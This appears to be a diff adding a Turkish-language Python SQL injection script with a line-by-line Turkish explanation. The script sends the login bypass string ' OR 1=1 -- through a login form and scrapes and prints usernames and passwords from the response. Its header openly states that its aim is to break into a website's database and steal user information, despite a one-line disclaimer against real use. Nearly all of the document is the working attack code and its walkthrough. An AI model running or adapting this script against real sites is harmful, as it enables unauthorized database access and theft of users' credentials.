@@ -1,0 +1,41 @@
+# SQL INJECTION zaafiyetleri için yapay zekalı bir kod örneği
+# Bu kod, bir web sitesinin veritabanına sızmayı ve kullanıcı bilgilerini çalmayı amaçlamaktadır.
+# Bu kod, Rıdvan Kaya tarafından oluşturulmuştur ve gerçek bir saldırıda kullanılmamalıdır.
+# Gerekli kütüphaneleri içe aktar
+import requests
+import re
+import random
+import string
+# Hedef web sitesinin URL'sini belirle
+target_url = "http://example.com/login.php"
+# SQL INJECTION saldırısı için kullanılacak karakter dizisi
+sql_injection = "' OR 1=1 -- "
+# Rıdvan Kaya tarafından oluşturulan rastgele bir kullanıcı adı ve şifre
+username = "".join(random.choice(string.ascii_letters) for i in range(10))
+password = "".join(random.choice(string.ascii_letters + string.digits) for i in range(10))
+# POST isteği için veri sözlüğü
+data = {"username": username + sql_injection, "password": password}
+# Hedef web sitesine POST isteği gönder ve yanıtı al
+response = requests.post(target_url, data=data)
+# Yanıtın içeriğini çözümle
+content = response.content.decode()
+# Yanıtın içeriğinde kullanıcı bilgilerini ara
+user_info = re.findall(r"Username: (.*)<br>Password: (.*)<br>", content)
+# Eğer kullanıcı bilgileri bulunursa, ekrana yazdır
+if user_info:
+    print("SQL INJECTION saldırısı başarılı!")
+    print("Çalınan kullanıcı bilgileri:")
+    for user in user_info:
+        print(f"Kullanıcı adı: {user[0]}")
+        print(f"Şifre: {user[1]}")
+else:
+    print("SQL INJECTION saldırısı başarısız!")
+#Yazan Rıdvan Kaya
+Bu kod, bir web sitesinin veritabanına sızmayı ve kullanıcı bilgilerini çalmayı amaçlayan bir SQL INJECTION saldırısı için Rıdvan Kaya tarafından oluşturulmuş bir örnektir. Kodun açıklaması şöyledir:
+- İlk olarak, gerekli kütüphaneleri içe aktarıyoruz. requests kütüphanesi, web sitesine HTTP istekleri göndermek için kullanılır. re kütüphanesi, düzenli ifadelerle metin işlemek için kullanılır. random ve string kütüphaneleri, rastgele karakter dizileri oluşturmak için kullanılır.
+- Sonra, hedef web sitesinin URL'sini belirliyoruz. Bu örnekte, http://example.com/login.php adresini kullanıyoruz. Bu, bir kullanıcı adı ve şifre isteyen bir giriş sayfasıdır.
+- Ardından, SQL INJECTION saldırısı için kullanılacak karakter dizisini tanımlıyoruz. Bu karakter dizisi, ' OR 1=1 --  şeklindedir. Bu, veritabanı sorgusunu bozmak ve her zaman doğru sonuç vermek için kullanılır. -- işareti, sorgunun geri kalanını yorum olarak görmezden gelmesini sağlar.
+- Daha sonra, Rıdvan Kaya tarafından oluşturulan rastgele bir kullanıcı adı ve şifre oluşturuyoruz. Bu, web sitesinin bizi gerçek bir kullanıcı olarak algılamasını sağlamak için yapılır. Bu örnekte, kullanıcı adı username ve şifre password değişkenlerine atanır.
+- Sonra, POST isteği için veri sözlüğünü oluşturuyoruz. Bu sözlük, kullanıcı adı ve şifre alanlarını içerir. Kullanıcı adı alanına, rastgele oluşturduğumuz kullanıcı adı ile SQL INJECTION karakter dizisini birleştiriyoruz. Şifre alanına, rastgele oluşturduğumuz şifreyi yazıyoruz.
+- Ardından, hedef web sitesine POST isteği gönderiyoruz ve yanıtı alıyoruz. requests kütüphanesinin post fonksiyonunu kullanarak, hedef URL ve veri sözlüğünü parametre olarak veriyoruz. Yanıtı response değişkenine atıyoruz.
+- Son olarak, yanıtın içeriğini çözümlüyoruz. Yanıtın içeriğini content değişkenine atamak için, response değişkeninin content özelliğini decode fonksiyonu ile çeviriyoruz. Yanıtın içeriğinde kullanıcı bilgilerini aramak için, re kütüphanesinin findall fonksiyonunu kullanıyoruz. Bu fonksiyon, düzenli bir ifade ile eşleşen tüm metinleri bir liste olarak döndürür. Bu örnekte, düzenli ifademiz r"Username: (.*)<br>Password: (.*)<br>" şeklindedir. Bu, Username: ve Password: ile başlayan ve <br> ile biten metinleri arar. Parantez içindeki kısımlar, eşleşen metnin gruplandırılmasını sağlar. Bu şekilde, kullanıcı adı ve şifre bilgilerini birer grup olarak alabiliriz. Eşleşen metinleri user_info değişkenine atıyoruz. Eğer user_info değişkeni boş değilse, yani kullanıcı bilgileri bulunursa, ekrana SQL INJECTION saldırısı başarılı! yazıyoruz ve çalınan kullanıcı bilgilerini yazdırıyoruz. Eğer user_info değişkeni boşsa, yani kullanıcı bilgileri bulunmazsa, ekrana SQL INJECTION saldırısı başarısız! yazıyoruz.
